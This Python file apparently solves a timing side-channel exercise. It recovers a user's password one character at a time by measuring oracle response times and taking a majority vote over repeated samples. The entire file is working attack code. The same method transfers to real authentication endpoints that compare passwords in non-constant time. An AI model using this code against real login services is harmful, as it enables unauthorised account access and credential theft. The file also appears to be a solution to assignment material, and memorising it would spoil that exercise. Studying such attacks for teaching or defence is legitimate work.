import config
from util.processing import concurrent


# test if (current_password + char) is valid
@concurrent
def test_chars(oracle_query, pw, char):
    valid, _ = oracle_query(pw + chr(char))
    return char if valid else 0


# test which (current_password + char + '-') takes the longest time to respond
@concurrent
def get_probable_chars(oracle_query, pw, chars):
    times = []
    for char in chars:
        valid, time = oracle_query(pw + chr(char) + "-")
        times.append(time)
    return chr(chars[times.index(max(times))])


def get_password(oracle_query, chars, log):

    current_password = ""
    # accommodate for an empty password
    valid, _ = oracle_query(current_password)
    if valid:
        return current_password

    # limit processing to 64 chars, this could be replaced with a while-true loop
    while len(current_password) < 64:

        log.log(f"Current password: '{current_password}'", 0)

        # test if (current_password + char) is valid, then return
        # this step is necessary, as we always append another char ('-') to the password to perform the timing attack
        probable_chars = test_chars((oracle_query, current_password, char) for char in chars)
        if any(probable_chars):
            return current_password + chr(max(probable_chars))

        certainty = 0
        most_common_char = ''
        # if there is no clear winner char (due to noise) we need to try again
        # i have set this threshold to 50% (arbitrary value that seems to work)
        while certainty < 0.5:

            if len(most_common_char) > 0:
                log.log(f"Certainty below 50%: trying again", 2)

            # list all probable chars
            # the winner (most common) gets selected of 24 tries (arbitrary value that seems to work)
            probable_chars = get_probable_chars((oracle_query, current_password, chars) for _ in range(24))
            most_common_char = max(set(probable_chars), key=probable_chars.count)
            log.log(f"""Proposed char(s): {probable_chars if config.verbosity > 1 else ''} ['{most_common_char}'] = {
                (probable_chars.count(most_common_char) / len(probable_chars)) * 100}%""", 1)
            certainty = probable_chars.count(most_common_char) / len(probable_chars)

        current_password += most_common_char

    raise RuntimeError("Password too long, char limit reached")


def timing_side_channel_handler(assignment, api, log, _case_id):

    # extract values
    user = assignment["user"]
    # all possible password chars
    chars = [*range(ord('a'), ord('z') + 1), *range(ord('A'), ord('Z') + 1), *range(ord('0'), ord('9') + 1)]

    def oracle_query(test_password):
        result = api.query_oracle("timing_sidechannel", {
            "user": user,
            "password": test_password
        })
        return result["status"] != "auth_failure", result.get("time", None)

    password = get_password(oracle_query, chars, log)

    return {
        "password": password
    }
